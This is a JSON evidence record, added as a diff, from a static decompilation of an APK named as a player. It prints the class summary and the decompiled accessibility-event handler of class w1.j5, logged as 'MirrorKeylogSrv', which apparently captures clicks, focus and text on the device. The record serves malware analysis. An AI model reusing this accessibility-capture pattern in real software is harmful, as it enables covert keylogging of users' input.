@@ -1,0 +1,146 @@
+{
+  "evidence_id": "ev_05972ff61317af7c91081276b3928f2878e0fe4119ec98f3530f4f734c4a8dcd",
+  "subject": {
+    "name": "player_unpacked_for_analysis.apk",
+    "digest": {
+      "sha256": "e456794fcf9aa27684ea91d6e9a62fe53cc6af594a8b1aba4fa82fa539d8579a"
+    },
+    "local_path": "C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk",
+    "format": "apk",
+    "architecture": null
+  },
+  "provider": {
+    "id": "jadx",
+    "name": "JADX headless",
+    "version": "0.7.1"
+  },
+  "analysis_profile": null,
+  "predicate_type": "rea.analysis",
+  "operation": "inspect_android_method",
+  "parameters": {
+    "path": "C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk",
+    "class_name": "w1.j5",
+    "method_name": "B"
+  },
+  "raw_result": {
+    "server": {
+      "name": "rea-jadx-bridge",
+      "version": "1"
+    },
+    "bridge_sha256": "40c6972bc7e1689e09979b64ba49ba04b9c05e49976b838315d63d6415e762ba",
+    "jar_sha256": "6e5eacf500b64292bfb73c49797c1958f6ee44646e43e868039ae7feb573ff75",
+    "loaded": {
+      "state": "LOADED",
+      "apk_path": "C:\\Users\\Romario\\AppData\\Local\\Temp\\rea-android-458cd6c9129cd8c6ec38dbed2bd57f74\\target.apk",
+      "class_count": 1441,
+      "resource_count": 111,
+      "threads": 1,
+      "resources": "full"
+    },
+    "calls": [
+      {
+        "operation": "rea_jvm_status",
+        "input": {},
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"metadata_scope\":\"parsed_members\",\"max_heap_bytes\":4223664128,\"java_version\":\"21.0.12.1\",\"available_processors\":12,\"engine_reported_version\":\"0.7.1\"}"
+            }
+          ],
+          "isError": false
+        }
+      },
+      {
+        "operation": "load_apk",
+        "input": {
+          "path": "C:\\Users\\Romario\\AppData\\Local\\Temp\\rea-android-458cd6c9129cd8c6ec38dbed2bd57f74\\target.apk",
+          "threads": 1,
+          "resources": "full"
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"state\":\"LOADED\",\"apk_path\":\"C:\\\\Users\\\\Romario\\\\AppData\\\\Local\\\\Temp\\\\rea-android-458cd6c9129cd8c6ec38dbed2bd57f74\\\\target.apk\",\"class_count\":1441,\"raw_class_count\":1441,\"resource_count\":111,\"load_duration_ms\":1655,\"decompile_timeout_ms\":90000,\"threads\":1,\"code_cache_size\":64,\"resources\":\"full\"}"
+            }
+          ]
+        }
+      },
+      {
+        "operation": "get_class_summary",
+        "input": {
+          "class_name": "w1.j5"
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"methods\":[{\"signature\":\"\\u003cclinit\\u003e(): void\",\"def_pos\":0,\"name\":\"\\u003cclinit\\u003e\",\"is_constructor\":false,\"dex_descriptor\":\"()V\"},{\"signature\":\"\\u003cinit\\u003e(d2.g, d2.v): void\",\"def_pos\":0,\"name\":\"\\u003cinit\\u003e\",\"is_constructor\":true,\"dex_descriptor\":\"(Ld2/g;Ld2/v;)V\"},{\"signature\":\"A(w1.i5, java.lang.String): w1.f5\",\"def_pos\":0,\"name\":\"A\",\"is_constructor\":false,\"dex_descriptor\":\"(Lw1/i5;Ljava/lang/String;)Lw1/f5;\"},{\"signature\":\"B(android.view.accessibility.AccessibilityEvent): void\",\"def_pos\":0,\"name\":\"B\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityEvent;)V\"},{\"signature\":\"C(java.lang.String, java.lang.String): java.lang.String\",\"def_pos\":0,\"name\":\"C\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\"},{\"signature\":\"D(java.lang.Throwable, java.lang.String, java.lang.Throwable): java.lang.Throwable\",\"def_pos\":0,\"name\":\"D\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/Throwable;Ljava/lang/String;Ljava/lang/Throwable;)Ljava/lang/Throwable;\"},{\"signature\":\"E(w1.i5): java.lang.String\",\"def_pos\":0,\"name\":\"E\",\"is_constructor\":false,\"dex_descriptor\":\"(Lw1/i5;)Ljava/lang/String;\"},{\"signature\":\"F(java.lang.String, boolean): boolean\",\"def_pos\":0,\"name\":\"F\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Z)Z\"},{\"signature\":\"G(java.lang.String): boolean\",\"def_pos\":0,\"name\":\"G\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)Z\"},{\"signature\":\"H(int, long, long): boolean\",\"def_pos\":0,\"name\":\"H\",\"is_constructor\":false,\"dex_descriptor\":\"(IJJ)Z\"},{\"signature\":\"I(android.view.accessibility.AccessibilityNodeInfo): java.lang.String\",\"def_pos\":0,\"name\":\"I\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;\"},{\"signature\":\"J(android.view.accessibility.AccessibilityNodeInfo): java.lang.String\",\"def_pos\":0,\"name\":\"J\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;\"},{\"signature\":\"K(): void\",\"def_pos\":0,\"name\":\"K\",\"is_constructor\":false,\"dex_descriptor\":\"()V\"},{\"signature\":\"L(): void\",\"def_pos\":0,\"name\":\"L\",\"is_constructor\":false,\"dex_descriptor\":\"()V\"},{\"signature\":\"M(java.lang.CharSequence): java.lang.String\",\"def_pos\":0,\"name\":\"M\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/CharSequence;)Ljava/lang/String;\"},{\"signature\":\"a(java.lang.String, java.lang.String): boolean\",\"def_pos\":0,\"name\":\"a\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ljava/lang/String;)Z\"},{\"signature\":\"b(android.view.accessibility.AccessibilityEvent): w1.h5\",\"def_pos\":0,\"name\":\"b\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityEvent;)Lw1/h5;\"},{\"signature\":\"c(android.view.accessibility.AccessibilityEvent): w1.i5\",\"def_pos\":0,\"name\":\"c\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityEvent;)Lw1/i5;\"},{\"signature\":\"d(android.view.accessibility.AccessibilityEvent): w1.i5\",\"def_pos\":0,\"name\":\"d\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityEvent;)Lw1/i5;\"},{\"signature\":\"e(java.lang.String): boolean\",\"def_pos\":0,\"name\":\"e\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)Z\"},{\"signature\":\"f(java.lang.String): boolean\",\"def_pos\":0,\"name\":\"f\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)Z\"},{\"signature\":\"g(java.lang.String, java.lang.String, java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, boolean): d2.w\",\"def_pos\":0,\"name\":\"g\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;IZ)Ld2/w;\"},{\"signature\":\"h(java.lang.String, java.lang.String, java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, boolean, java.lang.String, java.lang.String, java.lang.String): d2.w\",\"def_pos\":0,\"name\":\"h\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;IZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ld2/w;\"},{\"signature\":\"i(java.lang.String, boolean): boolean\",\"def_pos\":0,\"name\":\"i\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Z)Z\"},{\"signature\":\"j(long): void\",\"def_pos\":0,\"name\":\"j\",\"is_constructor\":false,\"dex_descriptor\":\"(J)V\"},{\"signature\":\"k(): void\",\"def_pos\":0,\"name\":\"k\",\"is_constructor\":false,\"dex_descriptor\":\"()V\"},{\"signature\":\"l(w1.d5): void\",\"def_pos\":0,\"name\":\"l\",\"is_constructor\":false,\"dex_descriptor\":\"(Lw1/d5;)V\"},{\"signature\":\"m(java.lang.String, int, java.lang.String, java.lang.String, java.lang.String, java.lang.String): java.lang.String\",\"def_pos\":0,\"name\":\"m\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\"},{\"signature\":\"n(android.view.accessibility.AccessibilityNodeInfo, int[]): java.lang.String\",\"def_pos\":0,\"name\":\"n\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityNodeInfo;[I)Ljava/lang/String;\"},{\"signature\":\"o(android.view.accessibility.AccessibilityEvent): java.lang.String\",\"def_pos\":0,\"name\":\"o\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;\"},{\"signature\":\"p(y.e): void\",\"def_pos\":0,\"name\":\"p\",\"is_constructor\":false,\"dex_descriptor\":\"(Ly/e;)V\"},{\"signature\":\"q(java.lang.String, y.e, boolean): void\",\"def_pos\":0,\"name\":\"q\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ly/e;Z)V\"},{\"signature\":\"r(): d2.x\",\"def_pos\":0,\"name\":\"r\",\"is_constructor\":false,\"dex_descriptor\":\"()Ld2/x;\"},{\"signature\":\"s(java.lang.String): boolean\",\"def_pos\":0,\"name\":\"s\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)Z\"},{\"signature\":\"t(android.view.accessibility.AccessibilityNodeInfo): boolean\",\"def_pos\":0,\"name\":\"t\",\"is_constructor\":false,\"dex_descriptor\":\"(Landroid/view/accessibility/AccessibilityNodeInfo;)Z\"},{\"signature\":\"u(java.lang.String): boolean\",\"def_pos\":0,\"name\":\"u\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)Z\"},{\"signature\":\"v(java.lang.String): boolean\",\"def_pos\":0,\"name\":\"v\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)Z\"},{\"signature\":\"w(char): boolean\",\"def_pos\":0,\"name\":\"w\",\"is_constructor\":false,\"dex_descriptor\":\"(C)Z\"},{\"signature\":\"x(java.lang.String, y.e): void\",\"def_pos\":0,\"name\":\"x\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;Ly/e;)V\"},{\"signature\":\"y(): void\",\"def_pos\":0,\"name\":\"y\",\"is_constructor\":false,\"dex_descriptor\":\"()V\"},{\"signature\":\"z(java.lang.String): void\",\"def_pos\":0,\"name\":\"z\",\"is_constructor\":false,\"dex_descriptor\":\"(Ljava/lang/String;)V\"}],\"method_count\":41,\"inner_class_count\":0,\"inner_classes\":[],\"name\":\"j5\",\"full_name\":\"w1.j5\",\"field_count\":37,\"fields\":[{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"A\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"B\"},{\"type\":\"int\",\"def_pos\":0,\"name\":\"C\"},{\"type\":\"boolean\",\"def_pos\":0,\"name\":\"D\"},{\"type\":\"long\",\"def_pos\":0,\"name\":\"E\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"F\"},{\"type\":\"java.util.HashSet\",\"def_pos\":0,\"name\":\"G\"},{\"type\":\"java.util.regex.Pattern\",\"def_pos\":0,\"name\":\"H\"},{\"type\":\"java.util.regex.Pattern\",\"def_pos\":0,\"name\":\"I\"},{\"type\":\"java.util.regex.Pattern\",\"def_pos\":0,\"name\":\"J\"},{\"type\":\"java.util.regex.Pattern\",\"def_pos\":0,\"name\":\"K\"},{\"type\":\"java.util.HashMap\",\"def_pos\":0,\"name\":\"f4307a\"},{\"type\":\"java.util.HashMap\",\"def_pos\":0,\"name\":\"f4308b\"},{\"type\":\"d2.y\",\"def_pos\":0,\"name\":\"f4309c\"},{\"type\":\"java.util.concurrent.atomic.AtomicBoolean\",\"def_pos\":0,\"name\":\"f4310d\"},{\"type\":\"boolean\",\"def_pos\":0,\"name\":\"f4311e\"},{\"type\":\"boolean\",\"def_pos\":0,\"name\":\"f4312f\"},{\"type\":\"java.lang.Object\",\"def_pos\":0,\"name\":\"f4313g\"},{\"type\":\"boolean\",\"def_pos\":0,\"name\":\"f4314h\"},{\"type\":\"y.e\",\"def_pos\":0,\"name\":\"f4315i\"},{\"type\":\"d2.g\",\"def_pos\":0,\"name\":\"f4316j\"},{\"type\":\"d2.v\",\"def_pos\":0,\"name\":\"f4317k\"},{\"type\":\"w1.e5\",\"def_pos\":0,\"name\":\"f4318l\"},{\"type\":\"long\",\"def_pos\":0,\"name\":\"f4319m\"},{\"type\":\"w1.o2\",\"def_pos\":0,\"name\":\"f4320o\"},{\"type\":\"w1.j3\",\"def_pos\":0,\"name\":\"f4321p\"},{\"type\":\"long\",\"def_pos\":0,\"name\":\"f4322q\"},{\"type\":\"boolean\",\"def_pos\":0,\"name\":\"f4323r\"},{\"type\":\"long\",\"def_pos\":0,\"name\":\"f4324s\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"f4325t\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"f4326u\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"f4327v\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"f4328w\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"f4329x\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"f4330y\"},{\"type\":\"java.lang.String\",\"def_pos\":0,\"name\":\"f4331z\"},{\"type\":\"d2.r\",\"def_pos\":0,\"name\":\"n\"}]}"
+            }
+          ],
+          "isError": false
+        }
+      },
+      {
+        "operation": "get_method_body",
+        "input": {
+          "class_name": "w1.j5",
+          "method_name": "B",
+          "overload_index": 0,
+          "smali_fallback": true
+        },
+        "response": {
+          "content": [
+            {
+              "type": "text",
+              "text": "{\"markers\":[],\"mode\":\"java\",\"full_name\":\"w1.j5.B\",\"class_name\":\"w1.j5\",\"overload_index\":0,\"fell_back\":false,\"body\":\"    public final void B(AccessibilityEvent accessibilityEvent) {\\r\\n        int eventType \\u003d accessibilityEvent.getEventType();\\r\\n        if (eventType \\u003d\\u003d 1) {\\r\\n            try {\\r\\n                h5 h5VarB \\u003d b(accessibilityEvent);\\r\\n                if (h5VarB !\\u003d null) {\\r\\n                    boolean z2 \\u003d h5VarB.f4198j;\\r\\n                    if (z2 || !F(h5VarB.f4189a, z2)) {\\r\\n                        l(new d2.c(this, h5VarB, 5));\\r\\n                        return;\\r\\n                    }\\r\\n                    return;\\r\\n                }\\r\\n                return;\\r\\n            } catch (Throwable th) {\\r\\n                a0.a.p(th, new StringBuilder(\\\"onAccessibilityEvent click: \\\"), \\\"MirrorKeylogSrv\\\");\\r\\n                return;\\r\\n            }\\r\\n        }\\r\\n        if (eventType \\u003d\\u003d 8) {\\r\\n            try {\\r\\n                i5 i5VarD \\u003d d(accessibilityEvent);\\r\\n                if (i5VarD \\u003d\\u003d null || F(i5VarD.f4241a, i5VarD.n)) {\\r\\n                    return;\\r\\n                }\\r\\n                synchronized (this.f4313g) {\\r\\n                    try {\\r\\n                        if (this.f4314h) {\\r\\n                            this.f4318l.a(new a5(this, i5VarD, this.f4315i, 0));\\r\\n                            return;\\r\\n                        }\\r\\n                        return;\\r\\n                    } catch (Throwable th2) {\\r\\n                        throw th2;\\r\\n                    }\\r\\n                }\\r\\n            } catch (Throwable th3) {\\r\\n                a0.a.p(th3, new StringBuilder(\\\"onAccessibilityEvent focus: \\\"), \\\"MirrorKeylogSrv\\\");\\r\\n                return;\\r\\n            }\\r\\n        }\\r\\n        if (eventType !\\u003d 16) {\\r\\n            return;\\r\\n        }\\r\\n        try {\\r\\n            i5 i5VarC \\u003d c(accessibilityEvent);\\r\\n            if (i5VarC \\u003d\\u003d null || F(i5VarC.f4241a, i5VarC.n)) {\\r\\n                return;\\r\\n            }\\r\\n            synchronized (this.f4313g) {\\r\\n                try {\\r\\n                    if (this.f4314h) {\\r\\n                        this.f4318l.a(new a5(this, i5VarC, this.f4315i, 1));\\r\\n                    }\\r\\n                } catch (Throwable th4) {\\r\\n                    throw th4;\\r\\n                }\\r\\n            }\\r\\n        } catch (Throwable th5) {\\r\\n            a0.a.p(th5, new StringBuilder(\\\"onAccessibilityEvent capture: \\\"), \\\"MirrorKeylogSrv\\\");\\r\\n        }\\r\\n    }\",\"overload_count\":1,\"method_name\":\"B\"}"
+            }
+          ],
+          "isError": false
+        }
+      }
+    ]
+  },
+  "normalized_result": {
+    "engine": {
+      "name": "jadx-headless-mcp",
+      "version": "0.7.1",
+      "artifact_sha256": "6e5eacf500b64292bfb73c49797c1958f6ee44646e43e868039ae7feb573ff75",
+      "source_revision": "5844800a486d2248fa949b74c9896285f5b54de2",
+      "worker_count": 1,
+      "heap_limit_mib": 4028
+    },
+    "class_name": "w1.j5",
+    "method": {
+      "name": "B",
+      "reported_signature": "B(android.view.accessibility.AccessibilityEvent): void",
+      "overload_index": 0,
+      "is_constructor": false,
+      "dex_descriptor": "(Landroid/view/accessibility/AccessibilityEvent;)V"
+    },
+    "overload_count": 1,
+    "representation": "java",
+    "body_status": "available",
+    "fell_back": false,
+    "markers": [],
+    "source": {
+      "status": "complete",
+      "text": "    public final void B(AccessibilityEvent accessibilityEvent) {\r\n        int eventType = accessibilityEvent.getEventType();\r\n        if (eventType == 1) {\r\n            try {\r\n                h5 h5VarB = b(accessibilityEvent);\r\n                if (h5VarB != null) {\r\n                    boolean z2 = h5VarB.f4198j;\r\n                    if (z2 || !F(h5VarB.f4189a, z2)) {\r\n                        l(new d2.c(this, h5VarB, 5));\r\n                        return;\r\n                    }\r\n                    return;\r\n                }\r\n                return;\r\n            } catch (Throwable th) {\r\n                a0.a.p(th, new StringBuilder(\"onAccessibilityEvent click: \"), \"MirrorKeylogSrv\");\r\n                return;\r\n            }\r\n        }\r\n        if (eventType == 8) {\r\n            try {\r\n                i5 i5VarD = d(accessibilityEvent);\r\n                if (i5VarD == null || F(i5VarD.f4241a, i5VarD.n)) {\r\n                    return;\r\n                }\r\n                synchronized (this.f4313g) {\r\n                    try {\r\n                        if (this.f4314h) {\r\n                            this.f4318l.a(new a5(this, i5VarD, this.f4315i, 0));\r\n                            return;\r\n                        }\r\n                        return;\r\n                    } catch (Throwable th2) {\r\n                        throw th2;\r\n                    }\r\n                }\r\n            } catch (Throwable th3) {\r\n                a0.a.p(th3, new StringBuilder(\"onAccessibilityEvent focus: \"), \"MirrorKeylogSrv\");\r\n                return;\r\n            }\r\n        }\r\n        if (eventType != 16) {\r\n            return;\r\n        }\r\n        try {\r\n            i5 i5VarC = c(accessibilityEvent);\r\n            if (i5VarC == null || F(i5VarC.f4241a, i5VarC.n)) {\r\n                return;\r\n            }\r\n            synchronized (this.f4313g) {\r\n                try {\r\n                    if (this.f4314h) {\r\n                        this.f4318l.a(new a5(this, i5VarC, this.f4315i, 1));\r\n                    }\r\n                } catch (Throwable th4) {\r\n                    throw th4;\r\n                }\r\n            }\r\n        } catch (Throwable th5) {\r\n            a0.a.p(th5, new StringBuilder(\"onAccessibilityEvent capture: \"), \"MirrorKeylogSrv\");\r\n        }\r\n    }",
+      "reported_total_bytes": null
+    }
+  },
+  "confidence": "derived",
+  "authority": "shipped-artifact",
+  "environment": null,
+  "limitations": [
+    "Static decompiler observations do not establish runtime behavior; the APK is never executed.",
+    "Method signatures use provider display types; DEX prototypes come from frozen JADX metadata. Display names may be aliases, and overload indices are local to this engine and artifact.",
+    "Class inventories use parsed metadata before code generation, including synthetic members that may be omitted from decompiled source. Source positions remain unknown.",
+    "Incoming reference totals count JADX using nodes. Direct invoke entries within a using method report raw DEX code-unit offsets and method indexes, but coverage is limited to those nodes and directly matched invokes; it does not establish every possible dynamic or reflective call site.",
+    "Manifest summary fields are extracted by the upstream engine; decoded XML is retained for verification. APK signatures, split APKs, native libraries and Android runtime capture are not verified by this provider."
+  ],
+  "relationship_coverage": null,
+  "locations": [],
+  "evidence_links": []
+}
